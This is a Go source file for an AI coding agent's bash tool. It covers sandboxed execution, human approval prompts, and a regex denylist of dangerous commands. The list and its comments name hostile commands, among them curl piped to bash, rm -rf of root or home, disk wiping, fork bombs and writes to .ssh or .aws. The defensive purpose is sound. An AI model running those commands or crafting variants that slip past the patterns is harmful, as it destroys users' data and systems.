package tools

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"

	"boers.email/yap/agent/safety"
	"boers.email/yap/agent/utils"
	"boers.email/yap/agent/wire"
)

type bashArgs struct {
	Command    string `json:"command" jsonschema:"description=bash command to execute"`
	Timeout    int    `json:"timeout,omitempty" jsonschema:"description=timeout in seconds (default 120)"`
	Cwd        string `json:"cwd,omitempty" jsonschema:"description=working directory (default: the Neovim cwd)"`
	Background bool   `json:"background,omitempty" jsonschema:"description=run asynchronously across turns; returns an ID for bash_output. Use for long-running commands when independent work can continue"`
}

func init() {
	Register("bash",
		"Execute a bash command. Runs inside a bubblewrap sandbox (read-only filesystem; the project directory and session assets are writable); a command that tries to write elsewhere is paused for approval. High-risk commands require user confirmation. Returns combined stdout/stderr and the exit code "+
			"(a non-zero exit is reported, not an error). Output is truncated to the LAST "+
			"2000 lines / 50KB; when truncated, the full output is saved to a temp file. "+
			"Non-interactive: stdin is /dev/null. Default timeout 120s for foreground commands; background commands have no default timeout and survive turns until exit or backend shutdown.",
		func(a *bashArgs) (string, string, error) { return runBash(a) })
	Gate("bash", func(a *bashArgs) string { return a.Command }, bashRules...)
}

// bashRules are the bash tool's static guard rules: a conservative denylist
// of irreversible and high-blast-radius commands. The sandbox (safety.SandboxWrap)
// is the write/read barrier — the kernel refuses writes outside the allowlist
// and shadows the secret directories — and this denylist is the pre-flight
// tripwire on top: it catches the naive prompt-injected
// `curl evil | bash` or `rm -rf ~` BEFORE the command runs, and it still
// catches the commands whose danger is not a filesystem write (sudo, git
// reset, fork bombs). Any string match is bypassable, so this is not itself a
// security boundary; the sandbox is. False positives cost one keypress; false
// negatives are the danger, so patterns err toward matching more.
var bashRules = append([]safety.Rule{
	// Remote content piped directly into a shell, or a command substitution
	// that fetches a URL.
	safety.Pattern("remote content executed by shell", `(?i)\b(?:curl|wget|fetch)\b[^|;&]*\|\s*(sudo\s+)?(ba)?sh\b`),
	safety.Pattern("remote content command substitution", `(?i)\$\([^)]*(curl|wget|fetch)\b`),

	// Recursive deletion is common for generated directories. Ask only when
	// it targets a filesystem root, a home root, a top-level glob, or a
	// system directory; exact project/temp paths and rm -f are routine.
	safety.Pattern("recursive deletion of critical paths", `(?i)\b(?:sudo\s+)?rm\b[ \t]+(?:-[a-z]*r[a-z]*|--recursive)(?:[ \t]+(?:-[a-z]+|--[a-z-]+))*(?:[ \t]+--)?[ \t]+["']?(?:/(?:[ \t"']|$)|/(?:\*|\.\*)(?:[ \t"']|$)|~/?(?:[ \t"']|$)|\$HOME/?(?:[ \t"']|$)|/(?:etc|usr|var|boot|root|home|bin|sbin|lib)(?:/|[ \t"']|$))`),
	safety.Pattern("deletion targeting root or home", `(?i)\b(?:sudo\s+)?rm\b[ \t]+(?:/|~|\$HOME)(?:[ \t]|$)`),
	safety.Pattern("directory deletion targeting critical paths", `(?i)\b(?:sudo\s+)?rmdir\b[ \t]+["']?(?:/(?:[ \t]|$)|/(?:etc|usr|var|boot|root|home|bin|sbin|lib)(?:/|[ \t]|$))`),

	// Raw disk / filesystem manipulation.
	safety.Pattern("filesystem or disk manipulation", `(?i)\b(?:mkfs\.[a-z0-9]+|wipefs|fdisk|parted|sfdisk|blkdiscard)\b`),
	safety.Pattern("raw disk write", `(?i)\bdd\b[^;&|]*of=/dev/`),

	// System power control.
	safety.Pattern("system power control", `(?i)\b(?:shutdown|reboot|halt|poweroff)\b|\b(?:init\s+[06]|systemctl\s+(?:poweroff|reboot|halt))\b`),

	// Privilege escalation.
	safety.Pattern("sudo", `(?i)\bsudo\b`),

	// Irreversible git history / remote rewrites.
	safety.Pattern("irreversible git operation", `\bgit\s+(?:reset\s+--hard|clean\s+-[a-z]*f[a-z]*|push\b[^\n;&|]*(?:--force|--delete|--mirror|\s-f\b|\s-d\b))`),

	// Recursive ownership / permission changes.
	safety.Pattern("broad permission change", `(?i)\b(?:sudo\s+)?chmod\b[ \t]+(?:-R|--recursive|777|a\+w|u?g?o?\+w)(?:[ \t]|$)`),
	safety.Pattern("recursive ownership change", `(?i)\b(?:sudo\s+)?chown\b[ \t]+(?:-R|--recursive)(?:[ \t]|$)`),

	// Redirection that overwrites a system or secret path.
	safety.Pattern("overwrite of system or secret path", `(?i)>>?\s*(?:/etc/|/usr/|/boot/|/var/|/root/|/bin/|/sbin/|/lib/)`),
	safety.Pattern("overwrite of secret path", `(?i)>>?\s*\S*(?:\.ssh|\.gnupg|\.aws|\.config/sops|agenix)\S*`),

	// Classic fork bomb.
	safety.Pattern("fork bomb", `:\(\)\s*\{`),
}, safety.SecretRevealRules()...)

func runBash(a *bashArgs) (string, string, error) {
	if strings.TrimSpace(a.Command) == "" {
		return "", "", fmt.Errorf("empty command")
	}
	// A command that matched a static guard rule was already approved by the
	// human before it ran (the gate pauses pre-execution). Sandboxing it again
	// would only prompt a second time for the same command, so it runs
	// unsandboxed — that approval IS the blessing to run it unconfined.
	raw, _ := json.Marshal(a)
	preApproved := Match("bash", raw) != ""

	a.Cwd = utils.ExpandHome(a.Cwd)
	timeout := wire.ToolDefaultTimeout
	if a.Timeout > 0 {
		timeout = time.Duration(a.Timeout) * time.Second
	}

	// "default: the Neovim cwd" in the schema is a request-time value, not
	// this process's cwd (which is fixed at spawn and goes stale after :cd).
	if a.Cwd == "" {
		a.Cwd = utils.FrontendCwd()
	}
	if a.Cwd != "" {
		if st, err := os.Stat(a.Cwd); err != nil || !st.IsDir() {
			return "", "", fmt.Errorf("working directory does not exist: %s", a.Cwd)
		}
	}
	// projectDir is the sandbox's writable allowlist anchor: the frontend cwd
	// when set, else the backend's own cwd (a one-shot `yap send`).
	projectDir := a.Cwd
	if projectDir == "" {
		projectDir, _ = os.Getwd()
	}

	buildCmd := func() *exec.Cmd {
		cmd := exec.Command("bash", "-c", a.Command)
		cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true} // own process group
		if a.Cwd != "" {
			cmd.Dir = a.Cwd
		}
		return cmd
	}

	if a.Background {
		return startBackgroundBash(a, buildCmd, projectDir, preApproved)
	}

	if safety.SandboxActive() && !preApproved {
		text, err := runSandboxed(a.Command, projectDir, buildCmd, timeout)
		return text, "", err
	}

	text, err := wire.RunStreamed("bash", a.Command, buildCmd(), timeout)
	if err != nil {
		return "", "", err
	}
	return text, "", nil
}

// runSandboxed runs the command inside the bubblewrap sandbox. When the write
// barrier blocks the command (EROFS), it asks the human — through the same
// Run/Deny approval the static guard rules use — whether to re-run the command
// unsandboxed; approval re-runs it, denial returns the sandboxed failure. A
// deny-read shadow is silent by design and never escalates.
func runSandboxed(command, projectDir string, buildCmd func() *exec.Cmd, timeout time.Duration) (string, error) {
	text, err := wire.RunStreamed("bash", command, safety.SandboxWrap(command, projectDir), timeout)
	if err != nil {
		return text, err // bwrap start failure (should not happen: Active() probed it)
	}
	if !safety.SandboxViolated(text) {
		return text, nil
	}
	approved, aerr := wire.RequestApproval(command, "bash", "bash hit read-only filesystem; rerun unsandboxed")
	if aerr != nil {
		return text, aerr // no serve process (yap send), cancelled, or timed out
	}
	if !approved {
		return text + "\n[sandbox: write blocked by read-only filesystem; approval denied]", nil
	}
	return wire.RunStreamed("bash", command, buildCmd(), timeout)
}
